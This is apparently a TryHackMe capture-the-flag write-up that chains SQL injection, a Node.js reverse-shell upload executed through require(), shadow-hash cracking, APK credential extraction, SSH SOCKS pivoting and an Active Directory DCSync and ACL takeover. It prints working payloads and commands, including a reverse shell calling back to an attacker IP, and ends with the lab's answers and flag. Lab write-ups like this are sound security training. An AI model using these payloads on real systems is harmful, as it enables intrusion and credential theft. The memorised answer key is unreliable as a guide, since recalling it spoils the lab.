# DeadDrop — TryHackMe Writeup

> **Scenario:** DeadDrop Ltd, a document-management and file-sharing company, has expanded its
> infrastructure and wants a security assessment before onboarding a major client. The entry point
> is an internet-facing file-sharing application. Behind it sits an internal corporate network with
> no direct access. **Goal:** compromise the Domain Controller and retrieve the flag from the
> administrator's desktop.

**Difficulty:** Medium · **Category:** Web → Linux → Pivot → Active Directory

---

## Table of Contents

1. [Network Overview](#network-overview)
2. [Attack Chain Summary](#attack-chain-summary)
3. [Phase 1 — Recon](#phase-1--recon)
4. [Phase 2 — Web Exploitation (SQLi)](#phase-2--web-exploitation-sqli)
5. [Phase 3 — Remote Code Execution](#phase-3--remote-code-execution)
6. [Phase 4 — Foothold & Linux Privilege Escalation](#phase-4--foothold--linux-privilege-escalation)
7. [Phase 5 — Mobile App Credentials](#phase-5--mobile-app-credentials)
8. [Phase 6 — Pivoting into the Internal Network](#phase-6--pivoting-into-the-internal-network)
9. [Phase 7 — Active Directory Compromise](#phase-7--active-directory-compromise)
10. [Answers](#answers)
11. [Remediation Summary](#remediation-summary)
12. [Lessons Learned](#lessons-learned)

---

## Network Overview

| Host          | IP               | Role                        | Notes                              |
|---------------|------------------|-----------------------------|------------------------------------|
| DeadDrop-DC   | 192.168.11.100   | Domain Controller           | `deaddrop.loc`, Server 2019        |
| WebServer     | 192.168.11.200   | DMZ web app (Node/Express)  | Entry point, dual-purpose pivot    |
| DeadDrop-WRK  | 192.168.11.51    | Windows workstation         | Firewalled from attacker           |
| Attacker      | tun0 (VPN)       | Kali                        | Reaches only .200 externally       |

> IPs may change on lab redeploy.

The firewall in front of the `192.168.11.0/24` segment only permits external traffic to the
web server (`.200`). The DC and workstation are `filtered` from the outside — they become reachable
only *after* landing on the web server, which acts as the pivot into the internal network.

---

## Attack Chain Summary

```
SQL injection (auth bypass + UNION credential dump) on /login
  → RCE via require() in /preview  (uploaded .js executed on module load)
  → shell as `node` on the web server (.200)
  → backup/shadow.bak → crack $6$ hash → SSH as svc-drop            [Q1]
  → mobile APK in ~/backup → strings.xml → j.harris credentials     [Q2]
  → SSH SOCKS tunnel via .200 → reach DC (.100)
  → j.harris holds WriteDacl / AddMembers over ITSupport-Admins     [Q3][Q4]
  → full domain dump (secretsdump / DCSync) + flag                  [Q5]
```

---

## Phase 1 — Recon

### Connectivity & firewall mapping

```bash
ip route
ping -c 2 192.168.11.200        # web server → replies (ttl 63 = 1 hop, Linux)
ping -c 2 192.168.11.100        # DC  → 100% loss
ping -c 2 192.168.11.51         # WRK → 100% loss

nmap -Pn -p 445,3389,88 --max-retries 1 192.168.11.100 192.168.11.51
# → all ports "filtered" on DC & WRK  (firewall drops external traffic)
```

**Reading the states:** `filtered` (silent drop by firewall) ≠ `closed` (host replies RST). The DC
and WRK answer nothing externally; only the web server is reachable.

### Port scan of the web server

```bash
nmap -p- --min-rate 5000 -T4 -Pn 192.168.11.200 -oN allports.txt
nmap -sCV -p 22,80 -Pn 192.168.11.200 -oN detail.txt
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Node.js Express framework
| http-title: DeadDrop - Login
```

Two services. SSH is current (no known RCE) → the SSH password must be *found*, not brute-forced.
The web app is **server-side Express** (not a SPA — confirmed by plain HTML forms, no JS bundle).

### Content discovery

```bash
ffuf -u http://192.168.11.200/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -mc all -fc 404 -t 15
```

```
login       [200]
dashboard   [302]  → redirects to /login (auth-gated)
logout      [302]
```

The entire attack surface funnels through the `/login` form.

---

## Phase 2 — Web Exploitation (SQLi)

### Baseline

```bash
curl -i -s -X POST http://192.168.11.200/login -d "username=admin&password=admin"
# → 200, 2124 bytes, "Invalid credentials", NO Set-Cookie
```

### Authentication bypass

```bash
# tautology
curl -i -s -X POST http://192.168.11.200/login \
  --data-urlencode "username=admin' OR '1'='1" --data-urlencode "password=x"
# → 302 Location: /dashboard + Set-Cookie: connect.sid=...   ← SUCCESS

# comment-out
curl -i -s -X POST http://192.168.11.200/login \
  --data-urlencode "username=admin'-- -" --data-urlencode "password=x"
# → 302 /dashboard
```

The bracket variant (`admin') OR ('1'='1'-- -`) returned `An error occurred`, revealing a **flat
query with no parentheses**: `WHERE username='...' AND password='...'`. A NoSQL `[$ne]` probe failed
→ it is a classic SQL backend (later confirmed to be **SQLite / better-sqlite3**).

> **Note:** `sqlmap` failed here (`not injectable`) because the injection is an auth-bypass signalled
> by a `302` redirect, not by content differentiation — sqlmap's default heuristics miss it.

### UNION-based credential extraction

The dashboard prints the logged-in username in `Logged in as <strong>...</strong>` — a **reflection
point**. Column count via `ORDER BY`: `1,2,3` → `302`, `4` → error ⇒ **3 columns**. Column 2 is
reflected.

```bash
# confirm reflection
curl -s -c u.txt -X POST http://192.168.11.200/login \
  --data-urlencode "username=zzz' UNION SELECT 1,'INJECTMARK',3-- -" --data-urlencode "password=x" -o /dev/null
curl -s -b u.txt http://192.168.11.200/dashboard | grep -i INJECTMARK
# → Logged in as INJECTMARK

# dump users (CHAR(58) = ':' avoids quote conflicts; LIMIT to page rows)
curl -s -c u.txt -X POST http://192.168.11.200/login \
  --data-urlencode "username=zzz' UNION SELECT 1,CONCAT(username,CHAR(58),password),3 FROM users LIMIT 0,1-- -" \
  --data-urlencode "password=x" -o /dev/null
curl -s -b u.txt http://192.168.11.200/dashboard | grep -i 'Logged in as'
```

Extracted application credentials:

```
admin:SuperSecretAdm1n!
svc-backup:BackupAgent2024
```

Neither worked for SSH — these are **application** accounts, not system accounts.

---

## Phase 3 — Remote Code Execution

Logging in (via the SQLi cookie) exposes `/dashboard` with file operations: `/upload`, `/preview/:filename`,
`/rename`, `/delete`.

### Enumerating the file primitives

- `/preview/:filename` — reads a file by name from the uploads dir. Path traversal via `../` is blocked
  (router collapses slashes / `path.basename`). LFI **not** possible here.
- `LOAD_FILE()` via SQLi returned empty — SQLite has no such function (MySQL-only), so file reads via SQL
  are impossible by design.
- `/upload` — keeps the original filename; file lands in the same dir `/preview` reads from. No direct
  static URL (`/uploads/x` → 404).

### The key insight: `/preview` executes `.js`

`/preview` behaves differently by extension. For `.txt` it renders text; for other types it serves the
file. **For `.js` it calls `require()`** — and `require()` *executes* the module on load. This is the RCE
vector. (Confirmed later from source — see Phase 4.)

### Reverse shell payload

An immediately-invoked function that spawns a shell and pipes it back over TCP. The trailing `return /a/`
gives `require()` a valid export so the Node process doesn't crash after the callback is wired up.

**`try.js`:**

```javascript
(function(){
    var net = require("net"),
        cp  = require("child_process"),
        sh  = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(4445, "192.168.21.27", function(){   // attacker tun0 IP : listener port
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

### Execution

```bash
# attacker: start listener on tun0
nc -lvnp 4445

# upload the payload (auth cookie required)
curl -s -b u.txt -X POST http://192.168.11.200/upload -F "file=@try.js"

# trigger require() by "previewing" it
curl -s -b u.txt http://192.168.11.200/preview/try.js
# → connection received → shell as `node`
```

> The uploads dir is a shared scratch space; give payloads unique names to avoid collisions with other
> testers' leftovers.

---

## Phase 4 — Foothold & Linux Privilege Escalation

### Stabilise & orient

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
id        # uid=996(node) gid=996(node)
hostname  # tryhackme-2404
```

### Source review (`/opt/app/app.js`)

The application source confirms every vulnerability:

```javascript
// SQL injection — raw string concatenation
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

// /preview — require()'s .js files → RCE
if (ext === '.js') {
  delete require.cache[require.resolve(filePath)];
  const moduleExport = require(filePath);   // arbitrary code execution
}
```

Backend confirmed as **`better-sqlite3`** (SQLite), explaining why `LOAD_FILE`/`@@secure_file_priv`
never worked.

### Credential in backup

```bash
cat /opt/app/backup/shadow.bak
# svc-drop:$6$f1331af25300c7f3$7twueSf8...CCH0:19700:0:99999:7:::
```

`$6$` = **sha512crypt** → hashcat mode **1800**.

```bash
hashcat -m 1800 shadow.hash /usr/share/wordlists/rockyou.txt
# svc-drop : dropsofjupiter
```

> **Cracking note:** `$6$` runs at only ~325 H/s on CPU (5000 SHA-512 iterations by design). It cracked
> here only because the password is an early rockyou entry. Strong `$6$` passwords are effectively
> GPU-or-nothing.

### SSH as svc-drop  → **Q1**

```bash
ssh svc-drop@192.168.11.200      # dropsofjupiter
id                                # uid=1001(svc-drop)
```

Home directory contents of interest:

```
~/.bash_history   (references deaddrop-mobile.apk)
~/backup/         (contains the mobile APK)
~/sylar/
~/.ssh/
```

---

## Phase 5 — Mobile App Credentials

`.bash_history` shows a prior operator handling `deaddrop-mobile.apk` under `~/backup/`.

```bash
find ~ -iname "*.apk" 2>/dev/null
scp svc-drop@192.168.11.200:/home/svc-drop/backup/.../deaddrop-mobile.apk .   # on Kali
```

An APK is a ZIP archive with no encryption by default — decompile and grep resources:

```bash
apktool d deaddrop-mobile.apk -o mobile_decoded
cat mobile_decoded/res/values/strings.xml | grep -iE 'user|pass|api'
```

```xml
<string name="api_endpoint">http://internal.tryhackme.loc/api/v1</string>
<string name="default_username">j.harris</string>
<string name="default_password">DropsOfJupiter2026!</string>
```

**Hardcoded credentials → Q2:** `j.harris:DropsOfJupiter2026!`

> `path_password_eye` etc. in `strings.xml` are SVG icon paths (UI resources), not secrets — filter by
> meaningful key names (`default_*`, `api_*`).

Password reuse pattern spotted: `svc-drop:dropsofjupiter` and `j.harris:DropsOfJupiter2026!` share the
same base.

---

## Phase 6 — Pivoting into the Internal Network

The web server sits **directly** in `192.168.11.0/24` (single NIC `ens5 = 192.168.11.200`). The firewall
only blocked *external* traffic — from the foothold, the DC is reachable.

```bash
# from the .200 shell — confirm internal reachability
for ip in 192.168.11.51 192.168.11.100; do
  timeout 2 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && echo "$ip 445 open"
done
# → 192.168.11.100 : 445 open, 88 open   (DC reachable!)
# → 192.168.11.51  : 445 filtered        (WRK host firewall)
```

### SOCKS tunnel through the foothold

```bash
# Kali — dynamic SOCKS proxy via the SSH foothold
ssh -D 1080 -N svc-drop@192.168.11.200

# /etc/proxychains.conf  →  socks5 127.0.0.1 1080

# validate
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!'
# → DEADDROP-DC  Windows Server 2019  domain:deaddrop.loc  (Pwn3d!)
```

`(Pwn3d!)` = `j.harris` has administrative access on the DC.

> **DNS caveat:** proxychains tunnels TCP but leaks UDP DNS to the system resolver (`4.2.2.2`), which
> doesn't know `deaddrop.loc`. Use direct IPs, or `--dns-tcp` / `--dns-server 192.168.11.100` so DNS
> rides the tunnel over TCP.
>
> **Tunnel choice:** `-D` (SOCKS) for many hosts/ports; `-L 13389:192.168.11.100:3389` (local forward)
> when one latency-sensitive service like RDP matters.

---

## Phase 7 — Active Directory Compromise

### Confirm code execution on the DC → **Q5**

```bash
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -x "whoami"
# → deaddrop\j.harris   (real RCE via wmiexec)

proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' \
  -x "type C:\Users\Administrator\Desktop\flag.txt"
```

```
THM{d34d_dr0p_d0m41n_pwn3d}
```

### Full domain dump (DCSync)

```bash
proxychains secretsdump.py deaddrop.loc/j.harris:'DropsOfJupiter2026!'@192.168.11.100
```

`secretsdump` uses the **DRSUAPI (DCSync)** replication protocol — it works only because `j.harris`
holds replication rights (granted via Domain Admins membership). Recovered `krbtgt`, `Administrator`,
all user NT hashes and Kerberos keys, plus `DEADDROP-WRK$`.

### ACL analysis → **Q3 & Q4**

Group membership shows `j.harris` is in `Domain Admins`, but the questions target the *ACL escalation
path*. BloodHound collection (via nxc, DNS over TCP):

```bash
proxychains nxc ldap 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' \
  --bloodhound -c All --dns-server 192.168.11.100 --dns-tcp
```

Direct ACL read pinpoints the delegated rights `j.harris` holds over a **custom** group:

```bash
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' \
  -x "net group \"ITSupport-Admins\" /domain"
# Comment: IT Support administrators (delegated DA-equivalent rights)
# Members: (empty — designed to be populated by the attacker)
```

```bash
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' \
  -X 'Get-ACL "AD:$((Get-ADGroup ITSupport-Admins).DistinguishedName)" | ...'
```

```
ActiveDirectoryRights   ObjectType                             IdentityReference
WriteProperty           bf9679c0-0de6-11d0-a285-00aa003049e2   DEADDROP\j.harris
```

The raw ACL grants `j.harris` **`WriteProperty`** on the `member` attribute (GUID `bf9679c0-...`),
plus **`WriteDacl`** and `WriteOwner` (from the BloodHound `groups.json`). BloodHound renders the
member-write edge as **`AddMembers` / `AddSelf`**.

- **Raw ACL right (report language):** `WriteDacl` / `WriteProperty(member)`
- **BloodHound edge (GUI language):** `AddMembers`

**Escalation path:** `j.harris --(WriteDacl / AddMembers)--> ITSupport-Admins --(DA-equivalent rights)--> Domain`.
The attacker adds themselves to the empty `ITSupport-Admins` group to inherit DA-equivalent rights:

```powershell
Add-ADGroupMember -Identity ITSupport-Admins -Members j.harris
```

(In this instance `j.harris` was already in Domain Admins, so the domain fell even before this step —
but this is the *intended* ACL vector the questions ask about.)

---

## Answers

| # | Question | Answer |
|---|----------|--------|
| Q1 | Password for SSH access to the web server | `dropsofjupiter` |
| Q2 | Credentials in the internal mobile app | `j.harris:DropsOfJupiter2026!` |
| Q3 | AD permission abusable for privilege escalation | `AddMembers` (raw ACL: `WriteDacl` / `WriteProperty` on `member`) |
| Q4 | Group targeted to escalate to Domain Admin | `ITSupport-Admins` |
| Q5 | Flag on the Domain Controller | `THM{d34d_dr0p_d0m41n_pwn3d}` |

---

## Remediation Summary

| Finding | Fix |
|---------|-----|
| SQL injection (`/login`) | Parameterised queries / prepared statements; never concatenate user input |
| RCE via `require()` in `/preview` | Never `require()` user-supplied files; render as text only; strict allow-list of extensions |
| Upload filter bypass (last-extension check) | Validate real content type; store outside web/app-executable paths; randomise filenames |
| Plaintext app creds in DB | Store password hashes (bcrypt/argon2), not plaintext |
| Secrets in backup (`shadow.bak`) readable by app user | Restrict backup permissions; keep backups off application-reachable paths |
| Hardcoded creds in APK | Never ship secrets client-side; issue short-lived tokens post-auth |
| Weak `$6$` password (`dropsofjupiter`) | Enforce length/complexity; ban dictionary words |
| Excessive ACL delegation (`WriteDacl` over DA-equivalent group) | Least privilege; audit delegated rights; tier-0 isolation; monitor group-membership writes |
| Flat internal reachability from DMZ | Segment DMZ from tier-0; restrict SMB/LDAP/Kerberos from the web server |

---

## Lessons Learned

- **Baseline before every test.** Knowing the exact "failure" response made the `302`+`Set-Cookie`
  success signal unambiguous — and exposed protocol quirks (SQLite vs MySQL) early.
- **Identify the DBMS first.** Chasing `LOAD_FILE`/`secure_file_priv` was wasted effort against SQLite.
- **`/preview` executing `.js` via `require()`** is the whole RCE — a file-serving primitive that
  behaves differently by extension is always worth probing for interpreter-relevant extensions
  (`.js` → Node, `.php` → PHP, template formats → SSTI).
- **Two representations of one right.** `WriteDacl` / `WriteProperty(member)` in raw ACLs == `AddMembers`
  / `AddSelf` in BloodHound. Know both: BloodHound for solving, raw ACL for reporting.
- **Tunnelling discipline:** `-D` (SOCKS) for breadth, `-L` for one stable service; watch DNS leaks
  through proxychains.

---

*Assessment performed in an authorised TryHackMe lab environment. All credentials, hashes and flags are
specific to that instance.*
